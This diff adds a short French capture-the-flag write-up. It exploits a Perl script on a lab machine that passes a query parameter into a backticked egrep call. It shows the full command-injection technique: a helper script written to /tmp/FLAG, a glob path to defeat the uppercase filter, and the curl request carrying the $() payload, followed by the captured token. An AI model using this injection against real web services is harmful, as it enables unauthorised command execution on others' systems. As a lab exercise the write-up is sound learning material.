@@ -1,0 +1,18 @@
+Dans ce niveau nous pouvons voir un script perl. Il est executé par flag12 via le port 4646. 
+Il prend en parametre un x et un y. 
+On peut voir que le script utilise x (arg0) afin d'effectuer une commande shell (egrep). 
+La faille se trouve à ce niveau la. 
+On doit donc essayer de lui faire executer `getflag`.
+
+faille : @output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+Sachant que xx est parsé par des regex. (supprime les espaces et transforme le txt en MAJ) 
+J'ai donc créé un fichier /tmp/FLAG en mettant la commande getflag>/tmp/res afin d'executé la commande dans la commande shell : `echo '/bin/getflag > /tmp/res' > /tmp/FLAG`
+On donne les droit d'ecriture à /tmp/FLAG : `chmod 777 /tmp/FLAG`
+
+Puis on lance une requete curl pour recuperer le flag. 
+
+`curl '192.168.56.101:4646?x=$(`/*/FLAG`)'`
+
+Le flag est écrit dans le fichier /tmp/res : `cat /tmp/res`
+=> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
